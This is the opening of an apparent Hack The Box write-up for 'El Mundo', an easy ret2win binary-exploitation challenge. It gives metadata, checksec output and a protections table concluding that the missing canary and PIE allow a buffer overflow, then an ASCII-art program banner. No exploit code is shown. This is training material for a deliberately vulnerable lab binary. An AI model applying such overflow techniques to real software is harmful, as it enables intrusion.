![](assets/banner.png)



<img src="assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">El Mundo</font>

‚Äã		15<sup>th</sup> September 2024 / Document No. DYY.102.XX

‚Äã		Prepared By: w3th4nds

‚Äã		Challenge Author(s): w3th4nds

‚Äã		Difficulty: <font color=green>Easy</font>

‚Äã		Classification: Official

 



# Synopsis

El Mundo is an easy difficulty challenge that features `ret2win` vulnerability.

# Description

You may not control time, but you can certainly control the flow of your program! Use your stand to bend it to your will!

## Skills Required

- Basic C, stack understanding.

## Skills Learned

- `ret2win`.

# Enumeration

First of all, we start with a `checksec`:  

```console
gef‚û§  checksec
Canary                        : ‚úò 
NX                            : ‚úì 
PIE                           : ‚úò 
Fortify                       : ‚úò 
RelRO                         : Full
```

### Protections üõ°Ô∏è

As we can see:

| Protection | Enabled  | Usage   | 
| :---:      | :---:    | :---:   |
| **Canary** | ‚ùå       | Prevents **Buffer Overflows**  |
| **NX**     | ‚úÖ       | Disables **code execution** on stack |
| **PIE**    | ‚ùå       | Randomizes the **base address** of the binary | 
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

Having `canary` and `PIE` disabled, means that we might have a possible `buffer overflow`.

The interface of the program looks like this:

```bash
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£†‚£§‚°§‚†¥‚†ñ‚†õ‚†õ‚†â‚†â‚†â‚¢â‚£Ω‚£∑‚£§‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£†‚£§‚£§‚†§‚†¥‚†í‚†ö‚†õ‚†õ‚†õ‚†â‚†â‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£†‚°§‚†∂‚†∂‚†õ‚†â‚†â‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£†‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°π‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚°¥‚†ö‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£§‚£¥‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚¢ª‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°ú‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£Ä‚£§‚£§‚£§‚£§‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ä‚£ß‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚†õ‚£õ‚£Ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Å‚†ò‚£¶‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£¥‚£∂‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∂‚°∂‚†¨‚£ù‚£∂‚£∂‚†ñ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£æ‚£ø‚£ø‚°ø‚†õ‚†â‚£â‚£≠‚¢ø‚°õ‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†õ‚¢ø‚°Ü‚†∏‚£ø‚†ì‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚°û‚°á‚¢π‚†Ä‚£∑‚†à‚£ø‚£ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢∏‚£∑‚†Ä‚¢∏‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚°æ‚†ø‚†ø‚†ø‚¢ø‚°Ü‚†Ä‚¢ß‚¢±‚£∏‚£ß‚£ª‚£á‚¢ª‚£ø‚°é‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚£ø‚£ø‚†Ä‚£º‚¢Ä‚£Ä‚£º‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°º‚†ã‚†Ä‚††‚£§‚£Ä‚†Ä‚¢ª‚°Ñ‚°ü‚¢ø‚£ø‚°õ‚†â‚†ô‚£û‚£ø‚£á‚¢∏‚£ø‚£ø‚†ø‚¢ø‚£Å‚£Ä‚£á‚£ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚£¶‚£≠‚°≠‚£≠‚†è‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†à‚¢ø‚£¶‚†Ä‚¢£‚¢≥‚†Ä‚£à‚£ô‚£¶‚°Ä‚¢ø‚£Ω‚£ø‚†æ‚†ã‚†Å‚£Ä‚£¥‚£ø‚£ø‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚£ù‚†∂‚£§‚†ô‚¢æ‚°Ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚°á‚†Ä‚†Ä‚†Ä‚°Ñ‚¢à‚£ø‚°á‚¢∏‚°Ñ‚¢£‚¢ª‚£ø‚†ø‚†õ‚£ø‚†Å‚£†‚£§‚£æ‚£ü‚£©‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ª‚£¶‚°ª‚£Ñ‚°Ä‚£¶‚¢à‚£Å‚¢π‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£†‚£æ‚£É‚£æ‚£ø‚£ß‚†æ‚†ó‚†ã‚¢â‚£Ä‚£§‚£¥‚£ø‚£ø‚°ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£æ‚£ø‚£ø‚£ø‚¢∏‚°Ü‚¢ø‚†ø‚£á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°ì‚†≤‚¢¶‚†§‚†∂‚†∂‚†∂‚†∂‚°∂‚†ñ‚†í‚†õ‚¢â‚£â‚£â‚£†‚£º‚°∂‚†∂‚†ø‚†õ‚†â‚£°‚£æ‚†ø‚£´‚£¥‚£ø‚†ø‚¢ø‚£è‚¢â‚£õ‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°á‚†∏‚£Ü‚£â‚£†‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚°∑‚†§‚†º‚†§‚£§‚£§‚†§‚†¥‚†∑‚†∂‚†ü‚†õ‚†õ‚†õ‚†ã‚†â‚†Ä‚†Ä‚¢Ä‚£†‚£∂‚°ø‚¢ã‚£µ‚£ø‚£ø‚°ü‚¢ø‚£∂‚°§‚†Ω‚†º‚£ø‚£ø‚£ø‚£ø‚£ø‚°è‚¢Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°≥‚¢§‚£¨‚£Ω‚£Ø‚£§‚£§‚†Ä‚†Ä‚†Ä‚†Ä
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°º‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚£§‚£∂‚£ø‚°ø‚£õ‚£µ‚£ø‚¢ø‚£ø‚£§‚£Ω‚£ø‚†ü‚£õ‚£Ø‚£Ω‚£ø‚¢ª‚£ø‚£ø‚£ø‚£ø‚£á‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£è‚†õ‚¢≤‚°î‚†õ‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚£†
  ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚†ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£Ä‚£Ä‚£§‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚£Ø‚£µ‚£ø‚£ø‚£ø‚£∑‚£æ‚¢ø‚†ø‚£ø‚°ø‚£Ω‚°á‚¢Ä‚£º‚£Ω‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚†ô‚£ø‚£ø‚£ø‚£ø‚¢ø‚°ü‚¢ø‚£á‚†Ä‚¢ß‚†Ä‚†Ä‚†Ä‚£Ä‚°∂‚†ã‚†â
  ‚†Ä‚†Ä‚†Ä‚£Ä‚°æ‚†ã‚†Ä‚†Ä‚†Ä‚†ê‚†í‚†∂‚†∂‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ç‚£ø‚£ã‚£µ‚°ø‚¢æ‚£Ä‚£à‚°Ω‚†∑‚†û‚†â‚†â‚†â‚£ø‚£ø‚£ø‚£ø‚£ø‚£á‚£º‚£ø‚£ø‚†è‚£ø‚£à‚¢∑‚°à‚¢ø‚£Ü‚°ò‚¢¶‚£Ä‚°∂‚†ã‚¢Ä‚£¥‚£æ
  ‚†Ä‚¢Ä‚°¥‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£§‚£¥‚£æ‚†ü‚¢õ‚£´‚£¥‚£ø‚£ø‚£ø‚£Ø‚£§‚£æ‚°ø‚†ü‚†õ‚†≥‚£æ‚†´‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†õ‚†ã‚¢ì‚£º‚£ø‚£ø‚£ø‚£ø‚£æ‚£è‚†â‚£¥‚°ü‚†Ä‚£¥‚£ø‚£ø‚£ø
  ‚£∂‚†ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£§‚£§‚£∂‚£ø‚†ø‚†õ‚£ã‚£°‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†â‚†â‚°Ω‚†Å‚†Ä‚†Ä‚†Ä‚†à‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚¢Ä‚£¥‚£ø‚†É‚¢ø‚†ü‚†õ‚†õ‚†õ‚†ª‚¢∑‚£º‚£†‚£æ‚£ø‚£ø‚£ø‚£ø
  ‚†Å‚†Ä‚£Ä‚£†‚£§‚£∂‚°∂‚†ø‚†ü‚¢ã‚£â‚£°‚°¥‚†∂‚†õ‚†â‚†â‚¢π‚£ø‚£ø‚£ø‚£ø‚†ø‚†ø‚¢ø‚†Ä‚†Ä‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢π‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£æ‚£ø‚†Ä‚£∂‚£∂‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
  ‚†æ‚†õ‚†õ‚¢â‚£â‚£§‚°∂‚†∂‚†ü‚†õ‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚£ø‚£ø‚†ã‚†Å‚†Ä‚†Ä‚£º‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
  ‚°¥‚†∂‚†õ‚†õ‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢≥‚°ú‚°Ü‚†Ä‚†Ä‚†Ä‚£è‚†Ä‚†Ä‚£†‚£§‚£¥‚°∂‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ü‚†â‚£©
  ‚°õ‚†õ‚†í‚†í‚†≤‚†∂‚†§‚†§‚†§‚†¥‚†∂‚†í‚†í‚†í‚†ö‚†õ‚†õ‚†â‚£â‚£ß‚°ò‚†Ä‚†Ä‚†Ä‚†à‚†ô‚†õ‚†ø‚†ø‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£ø‚£ø‚£ø‚°ø‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ü‚†ò‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚†É‚†Ä‚£†‚£æ‚£ø
  ‚°á‚†Ä‚†Ä‚£∂‚£∂‚£∂‚£∂‚£∂‚£¶‚£¶‚£§‚£§‚£§‚£∂‚£∂‚†∂‚†∂‚†ø‚¢õ‚£â‚£∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£Ä‚£ê‚£§‚£§‚£§‚£Ñ‚£Ä‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚£ø‚£ø‚°ü‚£±‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚†Ä‚¢ø‚£ø‚£ø‚£ø‚†ã‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø
  ‚£∑‚†Ä‚†Ä‚¢ø‚£ø‚£ç‚£Ñ‚£Ä‚£Ä‚£Ä‚£Ä‚£†‚£§‚£§‚£§‚£∂‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚¢∏‚†ü‚†â‚†õ‚†ã‚†â‚†â‚†â‚†â‚†â‚†Å‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚°ø‚¢ã‚£º‚°ü‚†Å‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ä‚¢∏‚£ø‚£ø‚°á‚†Ä‚†Ä‚£º‚£ø‚£ø‚£ø‚°á
  ‚£ø‚°Ä‚†Ä‚¢∏‚£ø‚£ø‚£§‚£§‚£§‚£§‚£§‚£∂‚£∂‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚†Ä‚†Ä‚†Ä‚¢°‚°Ä‚£†‚£§‚£§‚£§‚£§‚£§‚°¥‚†É‚†Ä‚†Ä‚¢Ä‚°ø‚¢ã‚£¥‚£ø‚£ø‚†Å‚††‚£ø‚£ø‚£ø‚†ã‚†â‚†ô‚£á‚¢∏‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø
  ‚£ø‚°á‚†Ä‚¢∏‚°õ‚£©‚£Ω‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚†Ä‚†Ä‚†Ä‚†ª‚†ø‚†õ‚†õ‚†ª‚†ø‚†ã‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£∂‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚¢ª‚†à‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø
  ‚£ø‚°á‚†Ä‚†Ä‚£ø‚£ø‚°ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†õ‚£∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚†ü‚†â‚£ø‚†Å‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£Ü‚†Ä‚†Ä‚¢∏‚°á‚£ø‚£ø‚°Ü‚†Ä‚†Ä‚£ø‚£ø‚£ø‚£ø‚†ø
  ‚£ø‚£ø‚†Ä‚†Ä‚£ø‚†ø‚†ø‚†æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†à‚¢≥‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£ø‚°ø‚†ã‚†Å‚†Ä‚¢†‚†è‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚¢∏‚£ß‚£ø‚£ø‚£ß‚†Ä‚†Ä‚¢ø‚£ø‚£ø‚£ø‚£Ñ
  ‚£ø‚£ø‚°Ä‚†Ä‚¢ª‚£Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ä‚†Ä‚†à‚¢ø‚£¶‚£§‚£§‚£§‚£§‚£§‚£∂‚£ø‚°ü‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚°û‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£¶‚£∏‚¢π‚£ø‚£ø‚†ü‚¢ß‚†Ä‚†Ä‚¢ª‚£ø‚£ø‚£ø
  ‚£ø‚£ø‚°á‚†Ä‚¢∏‚£ø‚£ø‚°è‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£á‚†Ä‚†Ä‚¢∏‚°ü‚¢ø‚£ø‚£ø‚£ø‚£ø‚†ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°û‚†Ä‚¢Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£æ‚£ø‚°è‚†Ä‚†à‚£∑‚£Ñ‚†Ä‚†ô‚£ø‚£ø
  ‚£ø‚£ø‚°á‚†Ä‚¢∏‚£ø‚£ø‚°á‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†õ‚£ø‚†Ä‚†Ä‚¢∏‚£ß‚°Ä‚†â‚†õ‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°û‚†Ä‚†Ä‚£ø‚†Ä‚†Ä‚†Ä‚£Ä‚£Å‚£Ä‚£Ä‚£à‚£â‚£≠‚£Ω‚£ø‚†Å‚†Ä‚¢∏‚£ø‚£ø‚£∑‚£¶‚£ø‚¢ø
  ‚£ø‚£ø‚°á‚†Ä‚¢∏‚£ø‚£ø‚£á‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü‚†Å‚†Ä‚†Ä‚¢∏‚†Ä‚†Ä‚¢∏‚£ø‚£∑‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚°û‚†Ä‚†Ä‚†Ä‚°è‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
  ‚†õ‚†â‚†â‚†â‚†â‚†â‚¢Å‚£†‚£¥‚£ø‚£ø‚£ø‚£ø‚†õ‚†ø‚£ø‚£ø‚£ø‚£ø‚†É‚†Ä‚†Ä‚†Ä‚£†‚°ø‚†Ä‚†Ä‚¢∏‚°ø‚†à‚†ª‚£ø‚°ø‚†Å‚†Ä‚†Ä‚¢†‚°º‚†ã‚†Ä‚†Ä‚†Ä‚¢Ä‚†á‚†Ä‚†Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ä‚¢Ä‚°º‚†õ‚†Å‚†Ä‚£π‚£ø‚£ø
  ‚†Ä‚¢Ä‚£†‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†ø‚¢ø‚£§‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°á‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚£†‚†û‚†â‚†Ä‚†Ä‚†Ä‚£Ä‚£†‚†æ‚°Ñ‚†Ä‚¢∏‚£ø‚£ø‚£ø‚†ü‚£ã‚£°‚£ø‚£ø‚£ø‚£ø‚†ü‚†Å‚†Ä‚¢Ä‚£¥‚£æ‚£ø‚£ø‚°ø
  ‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚£ã‚°Ω‚†ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†â‚†â‚†≥‚£¶‚£Ñ‚†Ä‚†∏‚†É‚†Ä‚†Ä‚¢Ä‚£¥‚¢ä‚£Ä‚£Ä‚£†‚†¥‚†ñ‚†ö‚†â‚†Å‚¢†‚†á‚††‚†ü‚¢´‚£ø‚†ø‚£∫‚£∑‚£ø‚£ø‚£ø‚°ø‚†É‚†Ä‚†Ä‚£∞‚£ø‚£ø‚°ø‚†õ‚†â‚†Ä
  ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚°û‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚†É‚†Ä‚¢Ä‚°¥‚†ö‚†ã‚†â‚†â‚†â‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚†è‚†Ä‚†Ä‚£†‚£ø‚¢£‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚†á‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚†è‚†Ä‚†Ä‚†Ä‚†Ä
